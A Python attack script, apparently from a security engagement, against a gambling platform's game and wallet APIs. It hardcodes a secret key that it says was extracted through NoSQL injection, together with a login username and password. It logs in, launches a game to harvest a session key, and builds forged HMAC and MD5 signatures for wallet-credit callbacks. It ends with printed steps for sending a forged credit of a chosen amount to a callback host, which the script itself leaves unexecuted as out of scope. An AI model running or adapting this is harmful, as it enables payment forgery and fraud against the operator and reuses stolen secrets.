#!/usr/bin/env python3
"""probe40.py — F40: Z-Seamless credit injection chain verification (in-scope steps only).

Scope constraint: wbwebapi.royalflush888.com and iframeapi.ifuse-api.com are OUT OF SCOPE.
This probe covers only:
  Step 1: /mb/enter-game (mgapi) → game launch token        [IN SCOPE]
  Step 2: HMAC construction proof using F02 JILI secret_key  [LOCAL]
  Step 3: URL parsing to recover 'be=' callback host         [LOCAL]

Steps that require out-of-scope targets (getLaunchGameData + /credit) are
documented but NOT executed.
"""
import json, requests, time, pathlib, base64, hmac, hashlib, sys

TID = "af6efb584a3d317b5a11ab6209b88e1b"  # vak88z2
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
H = {"template": "vn", "Content-Type": "application/json"}

# JILI secret_key extracted via F02 (NoSQL $where injection, /pb/latest-win)
JILI_SECRET = "a68a21221d37222969b99ea0463be0f0a9e51d2ce70aedf28afbeec96ec88e82"

# ── JWT ───────────────────────────────────────────────────────────────────────
jwt_file = pathlib.Path(".jwt.vak88z2")
if jwt_file.exists():
    jwt = jwt_file.read_text().strip()
    try:
        p = json.loads(base64.urlsafe_b64decode(jwt.split('.')[1] + '=='))
        if p.get('exp', 0) - time.time() > 300:
            print(f"[JWT] cached, {(p['exp']-time.time())/60:.0f}min left")
        else:
            jwt = None
    except Exception:
        jwt = None
else:
    jwt = None

if not jwt:
    print("[JWT] re-auth vak88z2...")
    r = requests.post(f"https://{TID}pbapi.asdgapicenterssdo.com/pb/authentication",
        json={"strategy": "local", "username": "0811111111", "password": "oceanslotz"},
        headers={"Content-Type": "application/json"}, timeout=15)
    if not r.ok:
        print(f"[JWT] FAIL: {r.status_code} {r.text[:200]}")
        sys.exit(1)
    jwt = r.json().get("accessToken") or r.json().get("token")
    jwt_file.write_text(jwt)
    print(f"[JWT] OK len={len(jwt)}")

H["Authorization"] = f"Bearer {jwt}"

# ── Step 1: enumerate game providers for JILI ─────────────────────────────────
print("\n[STEP 1] GET /mb/game-category — find JILI provider code...")
r = requests.get(f"{MGAPI}/mb/game-category", headers=H, timeout=15)
print(f"  {r.status_code}: {r.text[:400]}")

print("\n[STEP 1] GET /mb/payment-type?include=true — enumerate...")
r = requests.get(f"{MGAPI}/mb/payment-type?include=true", headers=H, timeout=15)
jili_game_ids = []
if r.ok:
    # Parse for JILI game entries
    text = r.text
    jili_idx = text.lower().find("jili")
    print(f"  JILI mention at idx={jili_idx}: ...{text[max(0,jili_idx-50):jili_idx+100]}...")

# ── Step 1a: get game list and find a JILI game to launch ────────────────────
print("\n[STEP 1a] GET /mb/game?provider=zgmulti_jili&limit=5 ...")
r = requests.get(f"{MGAPI}/mb/game?provider=zgmulti_jili&limit=5", headers=H, timeout=15)
print(f"  {r.status_code}: {r.text[:500]}")
game_id = None
if r.ok:
    try:
        games = r.json().get("data") or r.json()
        if isinstance(games, list) and games:
            game_id = games[0].get("id") or games[0].get("game_id")
            print(f"  first JILI game_id: {game_id}")
    except Exception:
        pass

# Also try a known JILI game ID from prior sessions
if not game_id:
    game_id = "clover-coins-3x5"  # from F40 evidence in report

# ── Step 1b: /mb/enter-game (in-scope) ───────────────────────────────────────
print(f"\n[STEP 1b] POST /mb/enter-game game_id={game_id} ...")
r = requests.post(f"{MGAPI}/mb/enter-game",
    json={"game_id": game_id, "device": "desktop"},
    headers=H, timeout=20)
print(f"  {r.status_code}: {r.text[:600]}")

game_url = None
if r.ok:
    try:
        d = r.json()
        game_url = (d.get("data") or d).get("url") or (d.get("data") or d).get("launch_url")
        print(f"\n  game_url: {game_url}")
    except Exception:
        pass

# ── Step 1c: parse 'be=' callback host from game URL (local, no OOB call) ────
be_host = None
if game_url:
    import urllib.parse
    parsed = urllib.parse.urlparse(game_url)
    params = urllib.parse.parse_qs(parsed.query)
    be_enc = params.get("be", [None])[0]
    if be_enc:
        be_host = be_enc[::-1]  # reversed domain
        print(f"\n[STEP 1c] be= param: {be_enc!r}")
        print(f"          reversed  : {be_host}")
    # Also look for ssoKey
    sso_key = params.get("ssoKey", [None])[0]
    api_id  = params.get("apiId", [None])[0]
    print(f"  ssoKey: {sso_key!r}")
    print(f"  apiId:  {api_id!r}")
else:
    print("  [WARN] no game_url obtained — cannot parse callback params")
    sso_key = "ea5631f7ed7cc16bba619cc1f561ad6b4aacf151"  # from prior session evidence
    api_id  = "1701"
    be_host = "wbwebapi.royalflush888.com"
    print(f"  [FALLBACK] using session-evidence values")

# ── Step 2: HMAC construction proof (local only) ─────────────────────────────
print(f"\n[STEP 2] HMAC signing proof — local dry-run")
print(f"  JILI secret_key (F02): {JILI_SECRET[:16]}...")

# JILI wallet credit callback typical signature: HMAC-SHA256 over key fields
# Format varies by provider — common pattern: sorted_params + secret
win_amount = 1000  # THB

def jili_hmac_v1(sso, amount, api_id, secret):
    msg = f"ssoKey={sso}&amount={amount}&apiId={api_id}&secret={secret}"
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

def jili_hmac_v2(sso, amount, api_id, secret):
    # Alternative: HMAC-SHA256(key=secret, msg=sorted query string without secret)
    params = sorted([f"ssoKey={sso}", f"amount={amount}", f"apiId={api_id}"])
    msg = "&".join(params)
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

def jili_hmac_v3(sso, amount, secret):
    # MD5 variant seen in some JILI integrations
    import hashlib as _hl
    raw = f"{sso}{amount}{secret}"
    return _hl.md5(raw.encode()).hexdigest()

print(f"  ssoKey: {sso_key!r}")
print(f"  amount: {win_amount}")
print(f"  apiId:  {api_id!r}")
print(f"  HMAC-v1 (concat): {jili_hmac_v1(sso_key, win_amount, api_id, JILI_SECRET)}")
print(f"  HMAC-v2 (sorted): {jili_hmac_v2(sso_key, win_amount, api_id, JILI_SECRET)}")
print(f"  HMAC-v3 (MD5):    {jili_hmac_v3(sso_key, win_amount, JILI_SECRET)}")

# ── Step 3: Scope boundary note ───────────────────────────────────────────────
print(f"""
[STEP 3] OUT-OF-SCOPE boundary — NOT executing:
  POST https://iframeapi.ifuse-api.com/getLaunchGameData  ← out_of_scope: ifuse-api.com
  POST https://{be_host}/credit                           ← out_of_scope: royalflush888.com

  To escalate F40 to CONFIRMED, add both domains to scope.json and re-run
  with ssoKey obtained live (60s TTL), then submit:
    {{
      "ssoKey": "<live_ssoKey>",
      "amount": 100,
      "apiId": "<apiId>",
      "sign": "<HMAC-vN above>"
    }}
  to POST https://{be_host}/credit (try /win, /result, /callback, /notify variants).
""")

print("=== DONE ===")
